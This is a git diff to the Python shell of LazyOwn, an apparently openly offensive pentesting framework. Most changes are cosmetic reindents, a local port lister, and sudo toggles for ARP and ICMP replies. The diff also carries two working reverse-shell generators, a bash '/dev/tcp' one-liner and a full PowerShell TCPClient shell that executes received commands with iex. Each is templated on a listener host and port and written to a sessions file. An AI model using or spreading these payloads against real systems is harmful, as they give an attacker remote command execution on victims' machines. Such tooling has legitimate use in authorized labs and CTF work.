@@ -30,26 +30,26 @@ from cmd import Cmd
 
 BANNER = """
 
- ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
-▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
-▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
-▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
-░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
-░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
-░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
-  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
-    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
-                 ░         ░ ░                                                
-  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
-▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
-▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
-░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
-░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
- ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
- ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
- ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
-          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
-[*] Iniciando: Framework [;,;] """
+    ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
+    ▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
+    ▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
+    ▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
+    ░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
+    ░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
+    ░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
+    ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
+        ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
+                    ░         ░ ░                                                
+    █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
+    ▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
+    ▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
+    ░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
+    ░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
+    ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
+    ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
+    ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
+            ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
+    [*] Iniciando: Framework [;,;] """
 
 version = "v0.0.12"
 # Definimos algunos códigos de escape ANSI para colores
@@ -105,17 +105,51 @@ def activate_virtualenv(venv_path):
 
     # Captura la salida del proceso hijo
     stdout, stderr = process.communicate()
-    print(f"{GREEN}[+] Entorno Activado.{RESET}")
+    print(f"    {GREEN}[+] Entorno Activado.{RESET}")
+
+def parse_proc_net_file(file_path):
+    ports = []
+    try:
+        with open(file_path, 'r') as f:
+            lines = f.readlines()
+
+        for line in lines[1:]:  # Skip the header line
+            parts = line.split()
+            if len(parts) < 2:
+                continue
+            
+            local_address = parts[1]
+            # Local address is in the format: "IP:PORT"
+            ip, port_hex = local_address.split(':')
+            port = int(port_hex, 16)  # Convert hex port to decimal
+
+            # Convert IP address from hex format to standard dot-decimal notation
+            ip_parts = [str(int(ip[i:i+2], 16)) for i in range(0, len(ip), 2)]
+            ip_address = '.'.join(ip_parts[::-1])  # Reverse the IP parts
+            
+            ports.append((ip_address, port))
+    except FileNotFoundError:
+        print(f"File {file_path} not found")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    
+    return ports
+
+def get_open_ports():
+    tcp_ports = parse_proc_net_file('/proc/net/tcp')
+    udp_ports = parse_proc_net_file('/proc/net/udp')
+    
+    return tcp_ports, udp_ports
 
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
-    intro = f"""{YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive shell! Type ? to list commands{BLUE}
-{GREEN}[+] Github:{BLUE} https://github.com/grisuno/LazyOwn
-{GREEN}[+] Web:{BLUE} https://grisuno.github.io/LazyOwn/
-{GREEN}[+] Reddit:{BLUE} https://www.reddit.com/r/LazyOwn/
-{GREEN}[+] Facebook:{BLUE} https://web.facebook.com/profile.php?id=61560596232150
-{GREEN}[+] hackTheBox:{BLUE} https://app.hackthebox.com/teams/overview/6429 {RESET}
-"""
+    intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive shell! Type ? to list commands{BLUE}
+    {GREEN}[+] Github:{BLUE} https://github.com/grisuno/LazyOwn
+    {GREEN}[+] Web:{BLUE} https://grisuno.github.io/LazyOwn/
+    {GREEN}[+] Reddit:{BLUE} https://www.reddit.com/r/LazyOwn/
+    {GREEN}[+] Facebook:{BLUE} https://web.facebook.com/profile.php?id=61560596232150
+    {GREEN}[+] hackTheBox:{BLUE} https://app.hackthebox.com/teams/overview/6429 {RESET}
+    """
     # Diccionario para almacenar alias
     aliases = {
         'ls': 'list',
@@ -125,8 +159,9 @@ class LazyOwnShell(Cmd):
         'sniff': 'run lazysniff',
         'ftpsniff': 'run lazyftpsniff',
     }
-    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
-
+    
+    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
+    
     def __init__(self):
         super().__init__()
         self.params = {
@@ -1178,10 +1213,9 @@ class LazyOwnShell(Cmd):
             print(f"[?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
             return
 
-        revshell = f"""
-#!/bin/bash
-bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-"""            
+        revshell = f"""#!/bin/bash
+        bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+        """.replace('        ','')
         print(f"[*] Try... echo '{revshell}' > sessions/revshell.sh ")
         os.system(f"echo '{revshell}' > sessions/revshell.sh ")
 
@@ -1194,9 +1228,8 @@ bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
             print(f"[?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
             return
 
-        revshell = """
-$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-""".replace('{lhost}',lhost).replace('{lport}',str(lport))
+        revshell = """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+        """.replace('{lhost}',lhost).replace('{lport}',str(lport)).replace('        ','')
 
         print(f"[*] Try... echo '{revshell}' > sessions/revshell.ps1 \n")
         
@@ -1332,6 +1365,68 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         print(f"{GREEN}[*] pwd directory copied to clipboard{RESET}")
         return
 
+    def do_ignorearp(self,line):
+        """echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore"""
+        print(f"{GREEN}[*] Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}")
+        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
+        print(f"{GREEN}[+] Done.{RESET}")
+        return
+
+    def do_ignoreicmp(self,line):
+        """echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"""
+        print(f"{GREEN}[*] Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}")
+        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
+        print(f"{GREEN}[+] Done.{RESET}")
+        return
+
+    def do_acknowledgearp(self,line):
+        """echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore"""
+        print(f"{GREEN}[*] Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}")
+        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
+        print(f"{GREEN}[+] Done.{RESET}")
+        return
+
+    def do_acknowledgeicmp(self,line):
+        """echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all"""
+        print(f"{GREEN}[*] Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}")
+        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
+        print(f"{GREEN}[+] Done.{RESET}")
+        return
+
+    def do_ports(self, line):
+        """Get all ports local"""
+        tcp_ports, udp_ports = get_open_ports()
+        print(f"{GREEN}[*] Open TCP Ports:{RESET}")
+        for ip, port in tcp_ports:
+            print(f"{CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")
+
+        print(f"\n{GREEN}[*] Open UDP Ports:{RESET}")
+        for ip, port in udp_ports:
+            print(f"{CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")    
+        return
+
+    def do_cports(self, line):
+        """Genera un comando para mostrar puertos TCP y UDP, y lo copia al portapapeles."""
+
+        # Define el comando con comillas escapadas adecuadamente
+        tcp_cmd = '''echo "TCP Ports:"; \
+        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/tcp; \
+        echo "UDP Ports:"; \
+        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
+        '''
+
+        # Imprimir el comando para verificar
+        print(GREEN, tcp_cmd, RESET)
+
+        # Copiar el comando al portapapeles
+        try:
+            # Usamos subprocess para manejar la entrada de manera segura
+            process = subprocess.Popen(['xclip', '-sel', 'clip'], stdin=subprocess.PIPE, text=True)
+            process.communicate(input=tcp_cmd)
+        except subprocess.CalledProcessError as e:
+            print(f"{RED}[-] Error: {e}{RESET}")
+
+        return
     def do_vpn(self,line):
         """Open vpn like htb vpn"""
         print("[+] Try... sudo openvpn *.ovpn")
